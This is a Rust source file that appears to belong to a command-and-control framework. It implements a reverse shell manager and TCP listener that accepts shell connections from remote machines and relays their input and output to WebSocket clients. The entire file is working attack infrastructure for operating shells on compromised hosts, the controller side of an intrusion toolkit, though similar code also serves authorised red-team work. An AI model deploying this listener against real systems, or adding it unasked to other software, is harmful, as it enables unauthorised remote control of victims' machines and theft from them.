use common::error::C2Result;
use log::{error, info};
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio::sync::{mpsc, broadcast, RwLock};
use std::collections::HashMap;
use uuid::Uuid;

/// Manages active reverse shell connections
pub struct ReverseShellManager {
    connections: Arc<RwLock<HashMap<String, (mpsc::Sender<Vec<u8>>, broadcast::Sender<Vec<u8>>)>>>,
}

impl ReverseShellManager {
    pub fn new() -> Self {
        Self {
            connections: Arc::new(RwLock::new(HashMap::new())),
        }
    }
    
    pub async fn get_connection(&self, connection_id: &str) -> Option<(mpsc::Sender<Vec<u8>>, broadcast::Receiver<Vec<u8>>)> {
        let connections = self.connections.read().await;
        if let Some((tx, broadcast_tx)) = connections.get(connection_id) {
            Some((tx.clone(), broadcast_tx.subscribe()))
        } else {
            None
        }
    }
    
    pub async fn list_connections(&self) -> Vec<String> {
        let connections = self.connections.read().await;
        connections.keys().cloned().collect()
    }
    
    async fn add_connection(&self, connection_id: String, tx: mpsc::Sender<Vec<u8>>, broadcast_tx: broadcast::Sender<Vec<u8>>) {
        let mut connections = self.connections.write().await;
        connections.insert(connection_id, (tx, broadcast_tx));
    }
    
    async fn remove_connection(&self, connection_id: &str) {
        let mut connections = self.connections.write().await;
        connections.remove(connection_id);
    }
}

/// Global reverse shell manager instance
static mut REVERSE_SHELL_MANAGER: Option<ReverseShellManager> = None;
static INIT: std::sync::Once = std::sync::Once::new();

pub fn get_reverse_shell_manager() -> &'static ReverseShellManager {
    unsafe {
        INIT.call_once(|| {
            REVERSE_SHELL_MANAGER = Some(ReverseShellManager::new());
        });
        REVERSE_SHELL_MANAGER.as_ref().unwrap()
    }
}

/// Starts a TCP listener for reverse shell connections.
/// Each connection gets a unique ID and can be accessed via WebSocket.
pub async fn start_listener(port: u16, _shell_manager: Arc<crate::managers::shell_manager::ShellManager>) -> C2Result<()> {
    let listener = TcpListener::bind(format!("0.0.0.0:{}", port)).await?;
    info!("Reverse shell listener started on port {}", port);

    loop {
        let (socket, peer_addr) = listener.accept().await?;
        let connection_id = Uuid::new_v4().to_string();
        info!("Accepted reverse shell connection from: {} (ID: {})", peer_addr, connection_id);

        tokio::spawn(handle_reverse_shell_connection(socket, peer_addr.to_string(), connection_id));
    }
}

async fn handle_reverse_shell_connection(
    socket: tokio::net::TcpStream,
    peer_addr: String,
    connection_id: String,
) {
    let (mut reader, mut writer) = socket.into_split();
    
    // Create channels for this connection
    let (tx_to_shell, mut rx_to_shell) = mpsc::channel::<Vec<u8>>(100);
    let (tx_from_shell, _rx_from_shell) = broadcast::channel::<Vec<u8>>(100);
    
    // Register this connection
    get_reverse_shell_manager().add_connection(connection_id.clone(), tx_to_shell, tx_from_shell.clone()).await;
    
    let connection_id_read = connection_id.clone();
    let connection_id_write = connection_id.clone();
    let tx_from_shell_clone = tx_from_shell.clone();
    
    // Task to read from shell and broadcast to WebSocket listeners
    let read_task = tokio::spawn(async move {
        let mut buf = vec![0; 1024];
        loop {
            match reader.read(&mut buf).await {
                Ok(0) => {
                    info!("Reverse shell client disconnected: {} (ID: {})", peer_addr, connection_id_read);
                    break;
                }
                Ok(n) => {
                    let data = buf[..n].to_vec();
                    // Broadcast shell output to all WebSocket listeners
                    let _ = tx_from_shell_clone.send(data);
                }
                Err(e) => {
                    error!("Error reading from reverse shell {}: {}", connection_id_read, e);
                    break;
                }
            }
        }
    });
    
    // Task to receive from WebSocket and write to shell
    let write_task = tokio::spawn(async move {
        while let Some(data) = rx_to_shell.recv().await {
            if let Err(e) = writer.write_all(&data).await {
                error!("Error writing to reverse shell {}: {}", connection_id_write, e);
                break;
            }
        }
    });
    
    // Wait for either task to complete, then cleanup
    tokio::select! {
        _ = read_task => {},
        _ = write_task => {},
    }
    
    // Remove connection from manager
    get_reverse_shell_manager().remove_connection(&connection_id).await;
    info!("Cleaned up reverse shell connection: {}", connection_id);
}
